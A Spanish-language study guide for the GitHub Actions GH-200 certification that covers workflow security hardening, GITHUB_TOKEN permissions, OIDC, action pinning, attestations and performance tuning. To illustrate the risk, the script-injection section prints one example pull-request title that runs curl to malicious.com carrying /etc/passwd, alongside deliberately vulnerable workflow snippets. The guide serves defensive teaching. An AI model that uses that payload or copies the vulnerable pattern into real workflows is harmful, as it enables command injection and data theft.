# Domain 5: Secure and Optimize Automation (10–15%)
 
> Guía completa para la certificación GitHub Actions GH-200
 
## 📑 Tabla de Contenidos
 
- [5.1 Implement security best practices](#51-implement-security-best-practices)
- [5.2 Optimize workflow performance and cost](#52-optimize-workflow-performance-and-cost)

---

## 5.1 Implement security best practices
 
### Environment protections y approval gates
 
```yaml
name: Secure Deployment
on: [push]
 
jobs:
  # Job sin protección (staging)
  deploy-staging:
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: echo "Auto-deploy to staging"

# Job con protección (producción requiere aprobación)
  deploy-production:
    needs: deploy-staging
    environment:
      name: production
      url: ${{ steps.deploy.outputs.url }}
    runs-on: ubuntu-latest
    steps:
      - id: deploy
        run: |
          echo "Deploy with human approval"
          echo "url=https://prod.example.com" >> $GITHUB_OUTPUT
```

**Configurar environment protection rules:**
 
1. Settings → Environments → production
2. Enable "Required reviewers"
3. Add reviewers (users or teams)
4. Enable "Wait timer" (ej: 10 minutos)
5. Restrict branches (ej: solo `main`)

**Recursos:**
- [Using environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)

### Trustworthy actions del Marketplace
 
#### Cómo identificar actions confiables
 
1. **Actions de GitHub** (`actions/*`): Máxima confianza
2. **Creadores verificados**: Badge azul en Marketplace
3. **Organizaciones reconocidas**: Docker, AWS, Azure, GCP

```yaml
steps:
  # ✅ Actions de GitHub (máxima confianza)
  - uses: actions/checkout@v4
  - uses: actions/setup-node@v4
  - uses: actions/cache@v4
 
  # ✅ Creadores verificados en Marketplace
  - uses: docker/build-push-action@v5
  - uses: aws-actions/configure-aws-credentials@v4
  - uses: azure/login@v1
 
  # ⚠️ Verificar antes de usar - third party
  - uses: unknown-user/unknown-action@v1  # Revisar código fuente
```

**Checklist para evaluar una action:**
 
- [ ] ¿El código fuente está disponible?
- [ ] ¿Tiene muchos usuarios/stars?
- [ ] ¿Está activamente mantenida?
- [ ] ¿Tiene un security policy?
- [ ] ¿Los permisos requeridos son mínimos?
- [ ] ¿Está verificada en el Marketplace?

**Recursos:**
- [GitHub Marketplace - Actions](https://github.com/marketplace?type=actions)
- [Security hardening - using third-party actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)

### Mitigar script injection
 
El **script injection** ocurre cuando datos no confiables se ejecutan como código.
 
#### Vulnerabilidades comunes
 
```yaml
# ❌ VULNERABLE - Input del usuario directo en run
steps:
  - name: Vulnerable
    run: |
      echo "${{ github.event.issue.title }}"  # Podría inyectar comandos
      echo "${{ github.event.pull_request.title }}"
```
 
**Ejemplo de ataque:**
 
```
PR title: test"; curl http://malicious.com/$(cat /etc/passwd) #
```
 
#### Mitigaciones
 
```yaml
# ✅ Correcto - sanitizar con env var
steps:
  - name: Safe - use env var
    env:
      ISSUE_TITLE: ${{ github.event.issue.title }}
    run: |
      echo "$ISSUE_TITLE"  # Siempre entre comillas, como env var
 
      # Validar input
      if [[ "$ISSUE_TITLE" =~ [^a-zA-Z0-9\ -] ]]; then
        echo "::error::Invalid characters in title"
        exit 1
      fi
 
  # ✅ Validación estricta
  - name: Validate inputs
    env:
      USER_INPUT: ${{ github.event.inputs.deployment_target }}
    run: |
      # Solo permitir valores esperados
      case "$USER_INPUT" in
        "staging"|"production"|"development")
          echo "Valid environment: $USER_INPUT"
          ;;
        *)
          echo "::error::Invalid environment: $USER_INPUT"
          exit 1
          ;;
      esac
 
  # ✅ Usar jq para parsing seguro de JSON
  - name: Safe JSON parsing
    env:
      EVENT: ${{ toJSON(github.event) }}
    run: |
      TITLE=$(echo "$EVENT" | jq -r '.pull_request.title // ""')
      echo "PR title: $TITLE"
```
 
**Permisos mínimos como mitigación adicional:**
 
```yaml
permissions:
  contents: read
  # Solo los permisos necesarios
```
 
**Casos específicos de riesgo (comentarios de PRs):**
 
```yaml
# ❌ Alto riesgo
jobs:
  risky:
    runs-on: ubuntu-latest
    steps:
      - name: RISKY
        run: echo "${{ github.event.comment.body }}"
 
# ✅ Seguro - sanitizar
jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      - name: Safe
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: |
          # Validar y sanitizar
          SAFE_COMMENT=$(echo "$COMMENT_BODY" | tr -dc '[:alnum:] .-_\n')
          echo "$SAFE_COMMENT"
```
 
**Recursos:**
- [Security hardening for GitHub Actions - Script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)

### GITHUB_TOKEN lifecycle y permissions
 
El **GITHUB_TOKEN** es un token efímero automático para cada workflow run.
 
**Características:**
 
1. **Efímero**: Expira cuando el workflow termina
2. **Scoped**: Solo tiene acceso al repositorio actual
3. **Automático**: No requiere configuración manual

#### Permisos predeterminados
 
```yaml
# Permisos por defecto (lectura para todo)
permissions:
  actions: read
  checks: read
  contents: read
  deployments: read
  id-token: none  # OIDC
  issues: read
  packages: read
  pull-requests: read
  repository-projects: read
  security-events: read
  statuses: read
```

#### Configurar permisos mínimos
 
```yaml
# Workflow con principio de menor privilegio
name: Secure Workflow
on: [push]
 
# 1. Revocar todos los permisos por defecto
permissions: {}
 
jobs:
  build:
    runs-on: ubuntu-latest
    # 2. Solo los permisos necesarios para este job
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - run: npm build
 
  create-pr:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - name: Create PR
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          gh pr create --title "Auto PR" --body "Auto-generated"
 
  publish-package:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - run: npm publish
```

#### GITHUB_TOKEN vs Personal Access Token (PAT)
 
| Feature | GITHUB_TOKEN | PAT |
|---------|---------------|-----|
| **Duración** | Solo el workflow run | Hasta 1 año |
| **Scope** | Solo el repositorio actual | Múltiples repos |
| **Creación** | Automática | Manual |
| **Revocación** | Automática | Manual |
| **Permisos** | Configurables | Basados en el usuario |
| **Auditoría** | Por workflow | Por usuario |
 
```yaml
# Usar GITHUB_TOKEN (recomendado)
steps:
  - name: Use GITHUB_TOKEN
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    run: gh pr create --title "PR"
 
# Usar PAT (solo cuando GITHUB_TOKEN no es suficiente)
steps:
  - name: Access other repository
    env:
      GH_TOKEN: ${{ secrets.MY_PAT }}  # PAT con acceso al otro repo
    run: gh api /repos/OTHER-ORG/OTHER-REPO/contents
```

**Recursos:**
- [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication)
- [Permissions for the GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

### OIDC token para cloud federation
 
El **OIDC (OpenID Connect)** permite autenticarse con cloud providers sin long-lived secrets.
 
**¿Cómo funciona?**
 
```
GitHub Actions → Genera OIDC token → Cloud Provider (AWS/Azure/GCP)
                                      ↓
                              Verifica token con GitHub OIDC endpoint
                                      ↓
                              Otorga credenciales temporales
```
 
#### Configuración con AWS
 
```yaml
name: AWS Deploy with OIDC
on: [push]
 
permissions:
  id-token: write  # ¡Requerido para OIDC!
  contents: read
 
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
 
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-role
          role-session-name: GitHubActionsSession
          aws-region: us-east-1
 
      - name: Deploy to AWS
        run: |
          aws s3 cp dist/ s3://my-bucket/ --recursive
```

**IAM Trust Policy para AWS:**
 
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:MY-ORG/MY-REPO:*"
        }
      }
    }
  ]
}
```

#### Configuración con Azure
 
```yaml
name: Azure Deploy with OIDC
on: [push]
 
permissions:
  id-token: write
  contents: read
 
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
 
      - name: Azure Login via OIDC
        uses: azure/login@v1
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
 
      - name: Deploy to Azure
        run: az webapp deploy --resource-group my-rg --name my-app
```
 
#### Configuración con GCP
 
```yaml
name: GCP Deploy with OIDC
on: [push]
 
permissions:
  id-token: write
  contents: read
 
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Authenticate to GCP
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/123/locations/global/workloadIdentityPools/my-pool/providers/my-provider
          service_account: my-service-account@my-project.iam.gserviceaccount.com
 
      - name: Deploy to GCR
        run: gcloud run deploy my-service --region us-central1
```
 
**Recursos:**
- [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [Configuring OpenID Connect in Amazon Web Services](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)
- [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure)
- [Configuring OpenID Connect in Google Cloud Platform](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform)

### Pin actions a commit SHA
 
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Mantener SHAs actualizados automáticamente
    groups:
      github-actions:
        patterns:
          - "actions/*"
          - "docker/*"
```
 
```yaml
# .github/workflows/ci.yml
# Con SHAs pinneados y comentarios de versión
steps:
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f  # v4.0.2
  - uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56  # v5.1.0
```
 
**Script para obtener SHA de actions:**
 
```bash
#!/bin/bash
# get-action-sha.sh
 
get_action_sha() {
  local repo=$1
  local tag=$2
 
  sha=$(gh api "repos/$repo/git/refs/tags/$tag" --jq '.object.sha')
 
  # Si es un annotated tag, obtener el commit SHA
  if [[ $(gh api "repos/$repo/git/tags/$sha" --jq '.type' 2>/dev/null) == "commit" ]]; then
    sha=$(gh api "repos/$repo/git/tags/$sha" --jq '.object.sha')
  fi
 
  echo "SHA para $repo@$tag: $sha"
}
 
# Uso
get_action_sha "actions/checkout" "v4.1.1"
get_action_sha "actions/setup-node" "v4.0.2"
```
 
**Recursos:**
- [Using third-party actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
- [Keeping your actions up to date with Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot)

### Enforce action usage policies
 
#### A nivel de organización
 
```
Settings → Actions → General → "Policies"
 
Opciones:
1. Disable GitHub Actions
2. Allow all actions
3. Allow specific actions:
   - GitHub Actions: always allowed
   - Marketplace verified: opt-in
   - Specify patterns: actions/*, my-org/*
```
 
#### Required reviewers para unverified actions
 
```
# GitHub requiere aprobación de la primera ejecución para:
# - Actions no aprobadas anteriormente
# - Actions de forks
# - PRs de forks en public repos
 
# Configurar en Settings → Actions:
# "Require approval for all outside collaborators"
# "Require approval for first-time contributors"
# "Require approval for all workflows"
```

**Recursos:**
- [Allowing specific actions to run](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#allowing-select-actions-and-reusable-workflows-to-run)
- [Approving workflow runs from public forks](https://docs.github.com/en/actions/managing-workflow-runs/approving-workflow-runs-from-public-forks)

### Artifact attestations y provenance
 
Las **attestations** proveen prueba criptográfica de cómo y dónde se construyeron los artifacts.
 
#### SLSA (Supply chain Levels for Software Artifacts)
 
```
SLSA Level 1: Provenance documentado
SLSA Level 2: Firmado digitalmente
SLSA Level 3: Fuente verificada, proceso aislado
SLSA Level 4: Proceso de build con two-person review
```
 
#### Generar attestations
 
```yaml
name: Build with Attestation
on: [push]
 
permissions:
  id-token: write
  contents: read
  attestations: write
 
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
 
      - name: Build application
        run: |
          npm ci
          npm run build
          tar czf artifact.tar.gz dist/
 
      # Generar SBOM (Software Bill of Materials)
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          output-file: sbom.spdx.json
 
      # Generar attestation
      - name: Attest artifact
        uses: actions/attest-build-provenance@v1
        with:
          subject-path: artifact.tar.gz
 
      # O para imágenes Docker
      - name: Build and push Docker image
        id: build
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: my-image:latest
 
      - name: Attest Docker image
        uses: actions/attest-build-provenance@v1
        with:
          subject-name: my-image
          subject-digest: ${{ steps.build.outputs.digest }}
```

#### Verificar attestation
 
```bash
# Verificar artifact
gh attestation verify artifact.tar.gz -R owner/repo
 
# Verificar imagen Docker
gh attestation verify oci://my-registry/my-image:latest -R owner/repo
```

#### Integrar en deployment
 
```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: my-artifact
 
      # Verificar antes de desplegar
      - name: Verify provenance
        run: |
          gh attestation verify artifact.tar.gz \
            -R ${{ github.repository }} \
            --deny-self-hosted-runners  # Solo runners hosted
 
      - name: Deploy
        run: ./deploy.sh
```

**Recursos:**
- [Using artifact attestations](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds)
- [actions/attest-build-provenance](https://github.com/actions/attest-build-provenance)
- [SLSA Framework](https://slsa.dev/)

---

## 5.2 Optimize workflow performance and cost
 
### Caching y retention para eficiencia
 
```yaml
name: Optimized Workflow
on: [push]
 
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
 
      # 1. Cache de dependencias (más usado)
      - name: Cache npm
        uses: actions/cache@v4
        id: npm-cache
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-npm-
 
      # 2. Cache de build output
      - name: Cache build
        uses: actions/cache@v4
        id: build-cache
        with:
          path: dist
          key: ${{ runner.os }}-build-${{ github.sha }}
          restore-keys: |
            ${{ runner.os }}-build-
 
      # 3. Instalar solo si necesario
      - name: Install dependencies
        if: steps.npm-cache.outputs.cache-hit != 'true'
        run: npm ci
 
      # 4. Build solo si no está en cache
      - name: Build
        if: steps.build-cache.outputs.cache-hit != 'true'
        run: npm run build
```

#### Cache management
 
```bash
# Listar caches
gh cache list
 
# Eliminar cache específico
gh cache delete CACHE_KEY
 
# Eliminar todos los caches de una rama
gh cache delete --all --ref refs/heads/feature-branch
 
# Via API
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/caches" \
  | jq '.actions_caches[].key'
```
 
#### Retention policies programáticas
 
```bash
#!/bin/bash
# cleanup-old-runs.sh
 
REPO="owner/repo"
DAYS_TO_KEEP=30
 
# Calcular fecha de corte
CUTOFF=$(date -d "$DAYS_TO_KEEP days ago" +%Y-%m-%dT%H:%M:%SZ)
 
# Obtener y eliminar runs antiguos
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/$REPO/actions/runs?per_page=100" \
  | jq -r ".workflow_runs[] | select(.created_at < \"$CUTOFF\") | .id" \
  | while read run_id; do
    # Eliminar logs del run
    curl -X DELETE \
      -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/repos/$REPO/actions/runs/$run_id/logs"
 
    echo "Deleted logs for run $run_id"
  done
```
 
**Recursos:**
- [Caching dependencies to speed up workflows](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows)
- [Managing caches in GitHub Actions](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#managing-caches)
- [Cache REST API](https://docs.github.com/en/rest/actions/cache)

### Strategies para scaling y optimización
 
#### 1. Optimizar matrix
 
```yaml
# En lugar de todos los combos:
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node: [18, 20, 22]
    # 9 jobs = costoso
 
# Optimizar (solo lo necesario):
strategy:
  matrix:
    include:
      # Tests en el OS principal con todas las versiones
      - os: ubuntu-latest
        node: 18
      - os: ubuntu-latest
        node: 20
      - os: ubuntu-latest
        node: 22
      # Solo versión LTS en otros OS
      - os: windows-latest
        node: 20
      - os: macos-latest
        node: 20
    # 5 jobs = más eficiente
```

#### 2. Concurrency groups
 
```yaml
# Evitar múltiples deploys simultáneos
name: Deploy
on: [push]
 
concurrency:
  group: deploy-${{ github.ref }}  # Por rama
  cancel-in-progress: true  # Cancela el anterior
 
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

#### 3. Path filters
 
```yaml
name: CI
on:
  push:
    paths:
      - 'src/**'      # Solo cuando cambia el código fuente
      - 'tests/**'
    paths-ignore:
      - '**.md'       # Ignorar cambios de documentación
      - 'docs/**'
```

#### 4. Conditional jobs
 
```yaml
name: Smart CI
on: [push, pull_request]
 
jobs:
  check-changes:
    runs-on: ubuntu-latest
    outputs:
      backend-changed: ${{ steps.check.outputs.backend }}
      frontend-changed: ${{ steps.check.outputs.frontend }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
 
      - name: Check changed files
        id: check
        run: |
          BACKEND_CHANGED=$(git diff --name-only HEAD~1 | grep "^backend/" | wc -l)
          FRONTEND_CHANGED=$(git diff --name-only HEAD~1 | grep "^frontend/" | wc -l)
          echo "backend=$( [ $BACKEND_CHANGED -gt 0 ] && echo 'true' || echo 'false' )" >> $GITHUB_OUTPUT
          echo "frontend=$( [ $FRONTEND_CHANGED -gt 0 ] && echo 'true' || echo 'false' )" >> $GITHUB_OUTPUT
 
  test-backend:
    needs: check-changes
    if: needs.check-changes.outputs.backend-changed == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Backend tests"
 
  test-frontend:
    needs: check-changes
    if: needs.check-changes.outputs.frontend-changed == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Frontend tests"
```

#### 5. Parallelization (sharding)
 
```yaml
name: Parallel Test Suite
on: [push]
 
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        shard: [1, 2, 3, 4]  # 4 shards paralelos
 
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
 
      - name: Run test shard ${{ matrix.shard }}
        run: |
          # Dividir tests en shards
          npx jest --shard=${{ matrix.shard }}/4 --coverage
 
      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.shard }}
          path: coverage/
 
  # Combinar resultados
  coverage-report:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          pattern: coverage-*
          merge-multiple: true
 
      - name: Combine coverage
        run: npx nyc merge coverage-* combined-coverage.json
```

#### 6. Skip CI
 
```yaml
# Usuarios pueden hacer commits con [skip ci] para evitar CI
name: CI
on:
  push:
    branches: [main]
 
jobs:
  build:
    # Verificar si debe saltar el CI
    if: |
      !contains(github.event.head_commit.message, '[skip ci]') &&
      !contains(github.event.head_commit.message, '[ci skip]') &&
      !contains(github.event.head_commit.message, '[no ci]')
    runs-on: ubuntu-latest
    steps:
      - run: npm test
```
 
#### 7. Optimizar Docker builds
 
```yaml
name: Optimized Docker Build
on: [push]
 
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
 
      # Configurar Docker Buildx para layer caching
      - uses: docker/setup-buildx-action@v3
 
      # Cache de layers de Docker
      - uses: actions/cache@v4
        with:
          path: /tmp/.buildx-cache
          key: ${{ runner.os }}-buildx-${{ github.sha }}
          restore-keys: |
            ${{ runner.os }}-buildx-
 
      - name: Build Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: my-image:latest
          cache-from: type=local,src=/tmp/.buildx-cache
          cache-to: type=local,dest=/tmp/.buildx-cache-new,mode=max
 
      # Mover cache para evitar crecimiento infinito
      - name: Move cache
        run: |
          rm -rf /tmp/.buildx-cache
          mv /tmp/.buildx-cache-new /tmp/.buildx-cache
```
 
#### 8. Timeouts
 
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 60  # Timeout del job completo
    steps:
      - name: Long step
        timeout-minutes: 30  # Timeout de un step específico
        run: |
          ./long-running-task.sh
```

#### 9. Monitoreo de costos
 
```bash
# Via API - obtener uso de minutos
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/billing/minutes" \
  | jq '{
    total_minutes: .total_minutes_used,
    remaining: .included_minutes - .total_minutes_used,
    breakdown: .minutes_used_breakdown
  }'
 
# Por organización
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/orgs/ORG/actions/billing/minutes"
```

**Recursos:**
- [Using concurrency](https://docs.github.com/en/actions/using-jobs/using-concurrency)
- [Workflow syntax - on.push.paths](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore)
- [Billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions)
- [Usage limits for GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration)
---
 
## 📚 Recursos Adicionales y Recomendados
 
### Documentación oficial GitHub
 
- [GitHub Actions documentation](https://docs.github.com/en/actions)
- [Workflow syntax reference](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [GitHub Actions expressions](https://docs.github.com/en/actions/learn-github-actions/expressions)
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Actions REST API](https://docs.github.com/en/rest/actions)
### Repositorios de referencia
 
- [actions/starter-workflows](https://github.com/actions/starter-workflows)
- [actions/toolkit](https://github.com/actions/toolkit)
- [actions/runner-images](https://github.com/actions/runner-images)
- [sdras/awesome-actions](https://github.com/sdras/awesome-actions)
### Herramientas
 
- [GitHub Actions VS Code Extension](https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-github-actions)
- [nektos/act - Run locally](https://github.com/nektos/act)
- [GitHub CLI](https://cli.github.com/)
### Para la certificación
 
- [GitHub Certifications](https://docs.github.com/en/get-started/showcase-your-expertise-with-github-certifications/about-github-certifications)
- [GitHub Learning Lab / Skills](https://github.com/orgs/skills)
- [GitHub Skills - Actions](https://skills.github.com/#automate-workflows-with-github-actions)
---
 
> **Tip de examen:** La certificación GH-200 pone énfasis especial en:
> - Sintaxis YAML correcta
> - Diferencias entre tipos de actions y workflows
> - Seguridad y permisos del GITHUB_TOKEN
> - OIDC para autenticación en cloud
> - Troubleshooting de workflows
> - Conceptos de matrix y reusable workflows
 
---
 
**⬅️ Anterior:** [Domain 4: Manage GitHub Actions for the Enterprise](./04-dominio.md)
**⬆️ Volver al:** [Índice principal](./README.md)




